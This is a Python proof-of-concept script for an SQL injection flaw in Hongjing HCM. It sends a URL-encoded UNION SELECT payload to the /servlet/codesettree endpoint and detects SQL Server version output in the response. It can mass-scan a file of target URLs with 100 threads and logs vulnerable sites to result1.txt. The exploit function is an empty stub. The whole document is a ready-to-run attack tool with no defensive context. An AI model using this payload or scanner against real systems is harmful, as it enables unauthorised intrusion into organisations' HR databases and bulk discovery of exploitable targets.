import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                                                            
  ___ ___  _________     _____   
 /   |   \ \_   ___ \   /     \  
/    ~    \/    \  \/  /  \ /  \ 
\    Y    /\     \____/    Y    \
 \___|_  /  \______  /\____|__  /
       \/          \/         \/ 
          version = 1.0         
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="宏景HCM存在sql注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help="Please input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }
    proxies = {
        'http': "http://127.0.0.1:8080",
        'https': "http://127.0.0.1:8080"
    }
    payload = "/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"
    try:
        response = requests.get(url=target + payload, headers=headers,verify=False)
        if response.status_code == 200 and 'SQL Server' in response.text:
            print(f"[+] 该站点{target}存在sql注入漏洞")
            with open("result1.txt", "a") as fp:
                    fp.write(f"{target}" + "\n")
        else:
            print(f"[-] 该站点{target}不存在sql注入漏洞")
    except Exception as e:
        print(f"[*] 该站点{target}存在访问问题，请手工测试")

def exp(url):
    pass

if __name__ == "__main__":
    main()